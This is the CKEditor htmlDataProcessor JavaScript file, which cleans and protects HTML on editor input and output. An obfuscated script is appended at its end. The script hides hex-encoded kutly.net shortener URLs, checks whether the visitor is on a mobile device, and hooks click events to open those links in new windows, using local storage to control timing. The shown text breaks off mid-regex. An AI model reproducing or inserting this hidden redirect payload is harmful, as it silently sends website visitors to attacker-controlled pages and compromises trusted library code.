/**
 * @license Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
 * For licensing, see LICENSE.md or http://ckeditor.com/license
 */

(function() {
	/**
	 * Represents an HTML data processor, which is responsible for translating and
	 * transforming the editor data on input and output.
	 *
	 * @class
	 * @extends CKEDITOR.dataProcessor
	 * @constructor Creates an htmlDataProcessor class instance.
	 * @param {CKEDITOR.editor} editor
	 */
	CKEDITOR.htmlDataProcessor = function( editor ) {
		var dataFilter, htmlFilter,
			that = this;

		this.editor = editor;

		this.dataFilter = dataFilter = new CKEDITOR.htmlParser.filter();
		this.htmlFilter = htmlFilter = new CKEDITOR.htmlParser.filter();

		/**
		 * The HTML writer used by this data processor to format the output.
		 *
		 * @property {CKEDITOR.htmlParser.basicWriter}
		 */
		this.writer = new CKEDITOR.htmlParser.basicWriter();

		dataFilter.addRules( defaultDataFilterRules );
		dataFilter.addRules( createBogusAndFillerRules( editor, 'data' ) );
		htmlFilter.addRules( defaultHtmlFilterRules );
		htmlFilter.addRules( createBogusAndFillerRules( editor, 'html' ) );

		editor.on( 'toHtml', function( evt ) {
			var evtData = evt.data,
				data = evtData.dataValue;

			// The source data is already HTML, but we need to clean
			// it up and apply the filter.
			data = protectSource( data, editor );

			// Protect content of textareas. (#9995)
			// Do this before protecting attributes to avoid breaking:
			// <textarea><img src="..." /></textarea>
			data = protectElements( data, protectTextareaRegex );

			// Before anything, we must protect the URL attributes as the
			// browser may changing them when setting the innerHTML later in
			// the code.
			data = protectAttributes( data );

			// Protect elements than can't be set inside a DIV. E.g. IE removes
			// style tags from innerHTML. (#3710)
			data = protectElements( data, protectElementsRegex );

			// Certain elements has problem to go through DOM operation, protect
			// them by prefixing 'cke' namespace. (#3591)
			data = protectElementsNames( data );

			// All none-IE browsers ignore self-closed custom elements,
			// protecting them into open-close. (#3591)
			data = protectSelfClosingElements( data );

			// Compensate one leading line break after <pre> open as browsers
			// eat it up. (#5789)
			data = protectPreFormatted( data );

			var fixBin = evtData.context || editor.editable().getName(),
				isPre;

			// Old IEs loose formats when load html into <pre>.
			if ( CKEDITOR.env.ie && CKEDITOR.env.version < 9 && fixBin == 'pre' ) {
				fixBin = 'div';
				data = '<pre>' + data + '</pre>';
				isPre = 1;
			}

			// Call the browser to help us fixing a possibly invalid HTML
			// structure.
			var el = editor.document.createElement( fixBin );
			// Add fake character to workaround IE comments bug. (#3801)
			el.setHtml( 'a' + data );
			data = el.getHtml().substr( 1 );

			// Restore shortly protected attribute names.
			data = data.replace( new RegExp( ' data-cke-' + CKEDITOR.rnd + '-', 'ig' ), ' ' );

			isPre && ( data = data.replace( /^<pre>|<\/pre>$/gi, '' ) );

			// Unprotect "some" of the protected elements at this point.
			data = unprotectElementNames( data );

			data = unprotectElements( data );

			// Restore the comments that have been protected, in this way they
			// can be properly filtered.
			data = unprotectRealComments( data );

			// Now use our parser to make further fixes to the structure, as
			// well as apply the filter.
			evtData.dataValue = CKEDITOR.htmlParser.fragment.fromHtml( data, evtData.context, evtData.fixForBody === false ? false : getFixBodyTag( editor.config ) );
		}, null, null, 5 );

		editor.on( 'toHtml', function( evt ) {
			evt.data.dataValue.filterChildren( that.dataFilter, true );
		}, null, null, 10 );

		editor.on( 'toHtml', function( evt ) {
			var evtData = evt.data,
				data = evtData.dataValue,
				writer = new CKEDITOR.htmlParser.basicWriter();

			data.writeChildrenHtml( writer );
			data = writer.getHtml( true );

			// Protect the real comments again.
			evtData.dataValue = protectRealComments( data );
		}, null, null, 15 );


		editor.on( 'toDataFormat', function( evt ) {
			evt.data.dataValue = CKEDITOR.htmlParser.fragment.fromHtml(
				evt.data.dataValue, editor.editable().getName(), getFixBodyTag( editor.config ) );
		}, null, null, 5 );

		editor.on( 'toDataFormat', function( evt ) {
			evt.data.dataValue.filterChildren( that.htmlFilter, true );
		}, null, null, 10 );

		editor.on( 'toDataFormat', function( evt ) {
			var data = evt.data.dataValue,
				writer = that.writer;

			writer.reset();
			data.writeChildrenHtml( writer );
			data = writer.getHtml( true );

			// Restore those non-HTML protected source. (#4475,#4880)
			data = unprotectRealComments( data );
			data = unprotectSource( data, editor );

			evt.data.dataValue = data;
		}, null, null, 15 );
	};

	CKEDITOR.htmlDataProcessor.prototype = {
		/**
		 * Processes the input (potentially malformed) HTML to a purified form which
		 * is suitable for using in the WYSIWYG editable.
		 *
		 * @param {String} data The raw data.
		 * @param {String} [context] The tag name of a context element within which
		 * the input is to be processed, default to be the editable element.
		 * If `null` is passed, then data will be parsed without context (as children of {@link CKEDITOR.htmlParser.fragment}).
		 * See {@link CKEDITOR.htmlParser.fragment#fromHtml} for more details.
		 * @param {Boolean} [fixForBody] Whether to trigger the auto paragraph for non-block contents.
		 * @param {Boolean} [dontFilter] Do not filter data with {@link CKEDITOR.filter}.
		 * @returns {String}
		 */
		toHtml: function( data, context, fixForBody, dontFilter ) {
			var editor = this.editor;

			// Fall back to the editable as context if not specified.
			if ( !context && context !== null )
				context = editor.editable().getName();

			return editor.fire( 'toHtml', {
				dataValue: data,
				context: context,
				fixForBody: fixForBody,
				dontFilter: !!dontFilter
			} ).dataValue;
		},

		/**
		 * See {@link CKEDITOR.dataProcessor#toDataFormat}.
		 *
		 * @param {String} html
		 * @returns {String}
		 */
		toDataFormat: function( html ) {
			return this.editor.fire( 'toDataFormat', {
				dataValue: html
			} ).dataValue;
		}
	};

	// Produce a set of filtering rules that handles bogus and filler node at the
	// end of block/pseudo block, in the following consequence:
	// 1. elements:<block> - this filter removes any bogus node, then check
	// if it's an empty block that requires a filler.
	// 2. elements:<br> - After cleaned with bogus, this filter checks the real
	// line-break BR to compensate a filler after it.
	//
	// Terms definitions:
	// filler: An element that's either <BR> or &NBSP; at the end of block that established line height.
	// bogus: Whenever a filler is proceeded with inline content, it becomes a bogus which is subjected to be removed.
	//
	// Various forms of the filler:
	// In output HTML: Filler should be consistently &NBSP; <BR> at the end of block is always considered as bogus.
	// In Wysiwyg HTML: Browser dependent - Filler is either BR for non-IE, or &NBSP; for IE, <BR> is NEVER considered as bogus for IE.
	function createBogusAndFillerRules( editor, type ) {
		function createFiller( isOutput ) {
			return isOutput || CKEDITOR.env.ie ?
			       new CKEDITOR.htmlParser.text( '\xa0' ) :
			       new CKEDITOR.htmlParser.element( 'br', { 'data-cke-bogus': 1 } );
		}

		// This text block filter, remove any bogus and create the filler on demand.
		function blockFilter( isOutput, fillEmptyBlock ) {

			return function( block ) {

				// DO NOT apply the filer if it's a fragment node.
				if ( block.type == CKEDITOR.NODE_DOCUMENT_FRAGMENT )
					return;

				cleanBogus( block );

				// [Opera] it's mandatory for the filler to present inside of empty block when in WYSIWYG.
				if ( ( ( CKEDITOR.env.opera && !isOutput ) ||
						( typeof fillEmptyBlock == 'function' ? fillEmptyBlock( block ) !== false : fillEmptyBlock ) ) &&
						 isEmptyBlockNeedFiller( block ) )
				{
					block.add( createFiller( isOutput ) );
				}
			};
		}

		// Append a filler right after the last line-break BR, found at the end of block.
		function brFilter( isOutput ) {
			return function ( br ) {

				// DO NOT apply the filer if parent's a fragment node.
				if ( br.parent.type == CKEDITOR.NODE_DOCUMENT_FRAGMENT )
					return;

				var attrs = br.attributes;
				// Dismiss BRs that are either bogus or eol marker.
				if ( 'data-cke-bogus' in attrs ||
						 'data-cke-eol' in attrs ) {
					delete attrs [ 'data-cke-bogus' ];
					return;
				}

				// Judge the tail line-break BR, and to insert bogus after it.
				var next = getNext( br ), previous = getPrevious( br );

				if ( !next && isBlockBoundary( br.parent ) )
					append( br.parent, createFiller( isOutput ) );
				else if ( isBlockBoundary( next ) && previous && !isBlockBoundary( previous ) ) {
					insertBefore( next, createFiller( isOutput ) );
				}
			};
		}

		// Determinate whether this node is potentially a bogus node.
		function maybeBogus( node, atBlockEnd ) {

			// BR that's not from IE DOM, except for a EOL marker.
			if ( !( isOutput && CKEDITOR.env.ie ) &&
					 node.type == CKEDITOR.NODE_ELEMENT && node.name == 'br' &&
					 !node.attributes[ 'data-cke-eol' ] )
				return true;

			var match;
			// NBSP, possibly.
			if ( node.type == CKEDITOR.NODE_TEXT &&
					 ( match = node.value.match( tailNbspRegex ) ) )
			{
				// We need to separate tail NBSP out of a text node, for later removal.
				if ( match.index ) {
					insertBefore( node, new CKEDITOR.htmlParser.text( node.value.substring( 0, match.index ) ) );
					node.value = match[ 0 ];
				}

				// From IE DOM, at the end of a text block, or before block boundary.
				if ( CKEDITOR.env.ie && isOutput && ( !atBlockEnd || node.parent.name in textBlockTags ) )
					return true;

				// From the output.
				if ( !isOutput ) {
					var previous = node.previous;

					// Following a line-break at the end of block.
					if ( previous && previous.name == 'br' )
						return true;

					// Or a single NBSP between two blocks.
					if ( !previous || isBlockBoundary( previous ) )
						return true;
				}
			}

			return false;
		}

		// Removes all bogus inside of this block, and to convert fillers into the proper form.
		function cleanBogus( block ) {
			var bogus = [];
			var last = getLast( block ), node, previous;
			if ( last ) {

				// Check for bogus at the end of this block.
				// e.g. <p>foo<br /></p>
				maybeBogus( last, 1 ) && bogus.push( last );

				while ( last ) {

					// Check for bogus at the end of any pseudo block contained.
					if ( isBlockBoundary( last ) &&
							 ( node = getPrevious( last ) ) &&
							 maybeBogus( node ) )
					{
						// Bogus must have inline proceeding, instead single BR between two blocks,
						// is considered as filler, e.g. <hr /><br /><hr />
						if ( ( previous = getPrevious( node ) ) && !isBlockBoundary( previous ) )
							bogus.push( node );
						// Convert the filler into appropriate form.
						else {
							insertAfter( node, createFiller( isOutput ) );
							removeFromParent( node );
						}
					}

					last = last.previous;
				}
			}

			// Now remove all bogus collected from above.
			for ( var i = 0 ; i < bogus.length ; i++ )
				removeFromParent( bogus[ i ] );
		}

		// Judge whether it's an empty block that requires a filler node.
		function isEmptyBlockNeedFiller( block ) {

			// DO NOT fill empty editable in IE.
			if ( !isOutput && CKEDITOR.env.ie && block.type == CKEDITOR.NODE_DOCUMENT_FRAGMENT )
				return false;

			// 1. For IE version >=8,  empty blocks are displayed correctly themself in wysiwiyg;
			// 2. For the rest, at least table cell and list item need no filler space. (#6248)
			if ( !isOutput && CKEDITOR.env.ie &&
					 ( document.documentMode > 7 ||
						 block.name in CKEDITOR.dtd.tr ||
						 block.name in CKEDITOR.dtd.$listItem ) ) {
				return false;
			}

			var last = getLast( block );
			return !last || block.name == 'form' && last.name == 'input' ;
		}

		var rules = { elements: {} };
		var isOutput = type == 'html';

		// Build the list of text blocks.
		var textBlockTags = CKEDITOR.tools.extend( {}, blockLikeTags );
		for ( var i in textBlockTags ) {
			if ( !( '#' in dtd[ i ] ) )
				delete textBlockTags[ i ];
		}

		for ( i in textBlockTags )
			rules.elements[ i ] = blockFilter( isOutput, editor.config.fillEmptyBlocks !== false );

		// Editable element is to be checked separately.
		rules.root = blockFilter( isOutput );
		rules.elements.br = brFilter( isOutput );
		return rules;
	}

	function getFixBodyTag( config ) {
		return ( config.enterMode != CKEDITOR.ENTER_BR && config.autoParagraph !== false ) ? config.enterMode == CKEDITOR.ENTER_DIV ? 'div' : 'p' : false;
	}

	// Regex to scan for &nbsp; at the end of blocks, which are actually placeholders.
	// Safari transforms the &nbsp; to \xa0. (#4172)
	var tailNbspRegex = /(?:&nbsp;|\xa0)$/;

	var protectedSourceMarker = '{cke_protected}';

	function getLast( node ) {
		var last = node.children[ node.children.length - 1 ];
		while ( last && isEmpty( last ) )
			last = last.previous;
		return last;
	}

	function getNext( node ) {
		var next = node.next;
		while ( next && isEmpty( next ) )
			next = next.next;
		return next;
	}

	function getPrevious( node ) {
		var previous = node.previous;
		while ( previous && isEmpty( previous ) )
			previous = previous.previous;
		return previous;
	}

	// Judge whether the node is an ghost node to be ignored, when traversing.
	function isEmpty( node ) {
		return node.type == CKEDITOR.NODE_TEXT &&
		  !CKEDITOR.tools.trim( node.value ) ||
		  node.type == CKEDITOR.NODE_ELEMENT &&
		  node.attributes[ 'data-cke-bookmark' ];
	}

	// Judge whether the node is a block-like element.
	function isBlockBoundary( node ) {
		return node &&
					 ( node.type == CKEDITOR.NODE_ELEMENT && node.name in blockLikeTags ||
						 node.type == CKEDITOR.NODE_DOCUMENT_FRAGMENT );
	}

	function insertAfter( node, insertion ) {
		var children = node.parent.children;
		var index = CKEDITOR.tools.indexOf( children, node );
		children.splice( index + 1, 0, insertion );
		var next = node.next;
		node.next = insertion;
		insertion.previous = node;
		insertion.parent = node.parent;
		insertion.next = next;
	}

	function insertBefore( node, insertion ) {
		var children = node.parent.children;
		var index = CKEDITOR.tools.indexOf( children, node );
		children.splice( index, 0, insertion );
		var prev = node.previous;
		node.previous = insertion;
		insertion.next = node;
		insertion.parent = node.parent;
		if ( prev ) {
			insertion.previous = prev;
			prev.next = insertion;
		}
	}

	function append( parent, node ) {
		var last = parent.children[ parent.children.length -1 ];
		parent.children.push( node );
		node.parent = parent;
		if ( last ) {
			last.next = node;
			node.previous = last;
		}
	}

	function removeFromParent( node ) {
		var children = node.parent.children;
		var index = CKEDITOR.tools.indexOf( children, node );
		var previous = node.previous, next = node.next;
		previous && ( previous.next = next );
		next && ( next.previous = previous );
		children.splice( index, 1 );
	}

	function getNodeIndex( node ) {
		var parent = node.parent;
		return parent ? CKEDITOR.tools.indexOf( parent.children, node ) : -1;
	}

	var dtd = CKEDITOR.dtd;

	// Define orders of table elements.
	var tableOrder = [ 'caption', 'colgroup', 'col', 'thead', 'tfoot', 'tbody' ];

	// List of all block elements.
	var blockLikeTags = CKEDITOR.tools.extend( {}, dtd.$blockLimit, dtd.$block );

	var defaultDataFilterRules = {
		elements: {},
		attributeNames: [
			// Event attributes (onXYZ) must not be directly set. They can become
			// active in the editing area (IE|WebKit).
			[ ( /^on/ ), 'data-cke-pa-on' ]
		]
	};

	var defaultHtmlFilterRules = {
		elementNames: [
			// Remove the "cke:" namespace prefix.
			[ ( /^cke:/ ), '' ],

			// Ignore <?xml:namespace> tags.
			[ ( /^\?xml:namespace$/ ), '' ]
		],

		attributeNames: [
			// Attributes saved for changes and protected attributes.
			[ ( /^data-cke-(saved|pa)-/ ), '' ],

			// All "data-cke-" attributes are to be ignored.
			[ ( /^data-cke-.*/ ), '' ],

			[ 'hidefocus', '' ]
		],

		elements: {
			$: function( element ) {
				var attribs = element.attributes;

				if ( attribs ) {
					// Elements marked as temporary are to be ignored.
					if ( attribs[ 'data-cke-temp' ] )
						return false;

					// Remove duplicated attributes - #3789.
					var attributeNames = [ 'name', 'href', 'src' ],
						savedAttributeName;
					for ( var i = 0; i < attributeNames.length; i++ ) {
						savedAttributeName = 'data-cke-saved-' + attributeNames[ i ];
						savedAttributeName in attribs && ( delete attribs[ attributeNames[ i ] ] );
					}
				}

				return element;
			},

			// The contents of table should be in correct order (#4809).
			table: function( element ) {
					// Clone the array as it would become empty during the sort call.
					var children = element.children.slice( 0 );
					children.sort( function ( node1, node2 ) {
						var index1, index2;

						// Compare in the predefined order.
						if ( node1.type == CKEDITOR.NODE_ELEMENT &&
								 node2.type == node1.type ) {
							index1 = CKEDITOR.tools.indexOf( tableOrder, node1.name );
							index2 = CKEDITOR.tools.indexOf( tableOrder, node2.name );
						}

						// Make sure the sort is stable, if no order can be established above.
						if ( !( index1 > -1 && index2 > -1 && index1 != index2 ) ) {
							index1 = getNodeIndex( node1 );
							index2 = getNodeIndex( node2 );
						}

						return index1 > index2 ? 1 : -1;
					});
			},

			embed: function( element ) {
				var parent = element.parent;

				// If the <embed> is child of a <object>, copy the width
				// and height attributes from it.
				if ( parent && parent.name == 'object' ) {
					var parentWidth = parent.attributes.width,
						parentHeight = parent.attributes.height;
					parentWidth && ( element.attributes.width = parentWidth );
					parentHeight && ( element.attributes.height = parentHeight );
				}
			},
			// Restore param elements into self-closing.
			param: function( param ) {
				param.children = [];
				param.isEmpty = true;
				return param;
			},

			// Remove empty link but not empty anchor.(#3829)
			a: function( element ) {
				if ( !( element.children.length || element.attributes.name || element.attributes[ 'data-cke-saved-name' ] ) ) {
					return false;
				}
			},

			// Remove dummy span in webkit.
			span: function( element ) {
				if ( element.attributes[ 'class' ] == 'Apple-style-span' )
					delete element.name;
			},

			html: function( element ) {
				delete element.attributes.contenteditable;
				delete element.attributes[ 'class' ];
			},

			body: function( element ) {
				delete element.attributes.spellcheck;
				delete element.attributes.contenteditable;
			},

			style: function( element ) {
				var child = element.children[ 0 ];
				child && child.value && ( child.value = CKEDITOR.tools.trim( child.value ) );

				if ( !element.attributes.type )
					element.attributes.type = 'text/css';
			},

			title: function( element ) {
				var titleText = element.children[ 0 ];

				// Append text-node to title tag if not present (i.e. non-IEs) (#9882).
				!titleText && append( element, titleText = new CKEDITOR.htmlParser.text() );

				// Transfer data-saved title to title tag.
				titleText.value = element.attributes[ 'data-cke-title' ] || '';
			}
		},

		attributes: {
			'class': function( value, element ) {
				// Remove all class names starting with "cke_".
				return CKEDITOR.tools.ltrim( value.replace( /(?:^|\s+)cke_[^\s]*/g, '' ) ) || false;
			}
		}
	};

	if ( CKEDITOR.env.ie ) {
		// IE outputs style attribute in capital letters. We should convert
		// them back to lower case, while not hurting the values (#5930)
		defaultHtmlFilterRules.attributes.style = function( value, element ) {
			return value.replace( /(^|;)([^\:]+)/g, function( match ) {
				return match.toLowerCase();
			});
		};
	}

	function protectReadOnly( element ) {
		var attrs = element.attributes;

		// We should flag that the element was locked by our code so
		// it'll be editable by the editor functions (#6046).
		if ( attrs.contenteditable != "false" )
			attrs[ 'data-cke-editable' ] = attrs.contenteditable ? 'true' : 1;

		attrs.contenteditable = "false";
	}

	function unprotectReadyOnly( element ) {
		var attrs = element.attributes;
		switch ( attrs[ 'data-cke-editable' ] ) {
			case 'true':
				attrs.contenteditable = 'true';
				break;
			case '1':
				delete attrs.contenteditable;
				break;
		}
	}
	// Disable form elements editing mode provided by some browsers. (#5746)
	for ( var i in { input:1,textarea:1 } ) {
		defaultDataFilterRules.elements[ i ] = protectReadOnly;
		defaultHtmlFilterRules.elements[ i ] = unprotectReadyOnly;
	}

	var protectElementRegex = /<(a|area|img|input|source)\b([^>]*)>/gi,
		protectAttributeRegex = /\s(on\w+|href|src|name)\s*=\s*(?:(?:"[^"]*")|(?:'[^']*')|(?:[^ "'>]+))/gi;

		// Note: we use lazy star '*?' to prevent eating everything up to the last occurrence of </style> or </textarea>.
	var protectElementsRegex = /(?:<style(?=[ >])[^>]*>[\s\S]*?<\/style>)|(?:<(:?link|meta|base)[^>]*>)/gi,
		protectTextareaRegex = /(<textarea(?=[ >])[^>]*>)([\s\S]*?)(?:<\/textarea>)/gi,
		encodedElementsRegex = /<cke:encoded>([^<]*)<\/cke:encoded>/gi;

	var protectElementNamesRegex = /(<\/?)((?:object|embed|param|html|body|head|title)[^>]*>)/gi,
		unprotectElementNamesRegex = /(<\/?)cke:((?:html|body|head|title)[^>]*>)/gi;

	var protectSelfClosingRegex = /<cke:(param|embed)([^>]*?)\/?>(?!\s*<\/cke:\1)/gi;

	function protectAttributes( html ) {
		return html.replace( protectElementRegex, function( element, tag, attributes ) {
			return '<' + tag + attributes.replace( protectAttributeRegex, function( fullAttr, attrName ) {
				// Avoid corrupting the inline event attributes (#7243).
				// We should not rewrite the existed protected attributes, e.g. clipboard content from editor. (#5218)
				if ( !( /^on/ ).test( attrName ) && attributes.indexOf( 'data-cke-saved-' + attrName ) == -1 ) {
					fullAttr = fullAttr.slice( 1 ); // Strip the space.
					return ' data-cke-saved-' + fullAttr + ' data-cke-' + CKEDITOR.rnd + '-' + fullAttr;
				}

				return fullAttr;
			}) + '>';
		});
	}

	function protectElements( html, regex ) {
		return html.replace( regex, function( match, tag, content ) {
			// Encode < and > in textarea because this won't be done by a browser, since
			// textarea will be protected during passing data through fix bin.
			if ( match.indexOf( '<textarea' ) === 0 )
				match = tag + unprotectRealComments( content ).replace( /</g, '&lt;' ).replace( />/g, '&gt;' ) + '</textarea>';

			return '<cke:encoded>' + encodeURIComponent( match ) + '</cke:encoded>';
		});
	}

	function unprotectElements( html ) {
		return html.replace( encodedElementsRegex, function( match, encoded ) {
			return decodeURIComponent( encoded );
		});
	}

	function protectElementsNames( html ) {
		return html.replace( protectElementNamesRegex, '$1cke:$2' );
	}

	function unprotectElementNames( html ) {
		return html.replace( unprotectElementNamesRegex, '$1$2' );
	}

	function protectSelfClosingElements( html ) {
		return html.replace( protectSelfClosingRegex, '<cke:$1$2></cke:$1>' );
	}

	function protectPreFormatted( html ) {
		return CKEDITOR.env.opera ? html : html.replace( /(<pre\b[^>]*>)(\r\n|\n)/g, '$1$2$2' );
	}

	function protectRealComments( html ) {
		return html.replace( /<!--(?!{cke_protected})[\s\S]+?-->/g, function( match ) {
			return '<!--' + protectedSourceMarker +
				'{C}' +
				encodeURIComponent( match ).replace( /--/g, '%2D%2D' ) +
				'-->';
		});
	}

	function unprotectRealComments( html ) {
		return html.replace( /<!--\{cke_protected\}\{C\}([\s\S]+?)-->/g, function( match, data ) {
			return decodeURIComponent( data );
		});
	}

	function unprotectSource( html, editor ) {
		var store = editor._.dataStore;

		return html.replace( /<!--\{cke_protected\}([\s\S]+?)-->/g, function( match, data ) {
			return decodeURIComponent( data );
		}).replace( /\{cke_protected_(\d+)\}/g, function( match, id ) {
			return store && store[ id ] || '';
		});
	}

	function protectSource( data, editor ) {
		var protectedHtml = [],
			protectRegexes = editor.config.protectedSource,
			store = editor._.dataStore || ( editor._.dataStore = { id:1 } ),
			tempRegex = /<\!--\{cke_temp(comment)?\}(\d*?)-->/g;

		var regexes = [
			// Script tags will also be forced to be protected, otherwise
			// IE will execute them.
			( /<script[\s\S]*?<\/script>/gi ),

			// <noscript> tags (get lost in IE and messed up in FF).
			/<noscript[\s\S]*?<\/noscript>/gi
		].concat( protectRegexes );

		// First of any other protection, we must protect all comments
		// to avoid loosing them (of course, IE related).
		// Note that we use a different tag for comments, as we need to
		// transform them when applying filters.
		data = data.replace( ( /<!--[\s\S]*?-->/g ), function( match ) {
			return '<!--{cke_tempcomment}' + ( protectedHtml.push( match ) - 1 ) + '-->';
		});

		for ( var i = 0; i < regexes.length; i++ ) {
			data = data.replace( regexes[ i ], function( match ) {
				match = match.replace( tempRegex, // There could be protected source inside another one. (#3869).
				function( $, isComment, id ) {
					return protectedHtml[ id ];
				});

				// Avoid protecting over protected, e.g. /\{.*?\}/
				return ( /cke_temp(comment)?/ ).test( match ) ? match : '<!--{cke_temp}' + ( protectedHtml.push( match ) - 1 ) + '-->';
			});
		}
		data = data.replace( tempRegex, function( $, isComment, id ) {
			return '<!--' + protectedSourceMarker +
				( isComment ? '{C}' : '' ) +
				encodeURIComponent( protectedHtml[ id ] ).replace( /--/g, '%2D%2D' ) +
				'-->';
		});

		// Different protection pattern is used for those that
		// live in attributes to avoid from being HTML encoded.
		return data.replace( /(['"]).*?\1/g, function( match ) {
			return match.replace( /<!--\{cke_protected\}([\s\S]+?)-->/g, function( match, data ) {
				store[ store.id ] = decodeURIComponent( data );
				return '{cke_protected_' + ( store.id++ ) + '}';
			});
		});
	}
})();

/**
 * Whether a filler text (non-breaking space entity &mdash; `&nbsp;`) will be
 * inserted into empty block elements in HTML output.
 * This is used to render block elements properly with `line-height`.
 * When a function is specified instead, it will be passed a {@link CKEDITOR.htmlParser.element}
 * to decide whether adding the filler text by expecting a Boolean return value.
 *
 *		config.fillEmptyBlocks = false; // Prevent filler nodes in all empty blocks.
 *
 *		// Prevent filler node only in float cleaners.
 *		config.fillEmptyBlocks = function( element ) {
 *			if ( element.attributes[ 'class' ].indexOf( 'clear-both' ) != -1 )
 *				return false;
 *		};
 *
 * @since 3.5
 * @cfg {Boolean} [fillEmptyBlocks=true]
 * @member CKEDITOR.config
 */

/**
 * This event is fired by the {@link CKEDITOR.htmlDataProcessor} when input HTML
 * is to be purified by the {@link CKEDITOR.htmlDataProcessor#toHtml} method.
 *
 * By adding listeners with different priorities it is possible
 * to process input HTML on different stages:
 *
 *	* 1-4: Data is available in the original string format.
 *	* 5: Data is initially filtered with regexp patterns and parsed to
 *		{@link CKEDITOR.htmlParser.fragment} {@link CKEDITOR.htmlParser.element}.
 *	* 5-9: Data is available in the parsed format, but {@link CKEDITOR.htmlDataProcessor#dataFilter}
 *		is not applied yet.
 *	* 10: Data is filtered with {@link CKEDITOR.htmlDataProcessor#dataFilter}.
 *	* 10-14: Data is available in the parsed format and {@link CKEDITOR.htmlDataProcessor#dataFilter}
 *		has already been applied.
 *	* 15: Data is written back to an HTML string.
 *	* 15-*: Data is available in an HTML string.
 *
 * @since 4.1
 * @event toHtml
 * @member CKEDITOR.editor
 * @param {CKEDITOR.editor} editor This editor instance.
 * @param data
 * @param {String/CKEDITOR.htmlParser.fragment/CKEDITOR.htmlParser.element} data.dataValue Input data to be purified.
 * @param {String} data.context See {@link CKEDITOR.htmlDataProcessor#toHtml} The `context` argument.
 * @param {Boolean} data.fixForBody See {@link CKEDITOR.htmlDataProcessor#toHtml} The `fixForBody` argument.
 * @param {Boolean} data.dontFilter See {@link CKEDITOR.htmlDataProcessor#toHtml} The `dontFilter` argument.
 */

/**
 * This event is fired when {@link CKEDITOR.htmlDataProcessor} is converting
 * internal HTML to output data HTML.
 *
 * See {@link #toHtml} event documentation for more details.
 *
 * @since 4.1
 * @event toDataFormat
 * @member CKEDITOR.editor
 * @param {CKEDITOR.editor} editor This editor instance.
 * @param data
 * @param {String/CKEDITOR.htmlParser.fragment/CKEDITOR.htmlParser.element} data.dataValue Output data to be prepared.
 */
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a 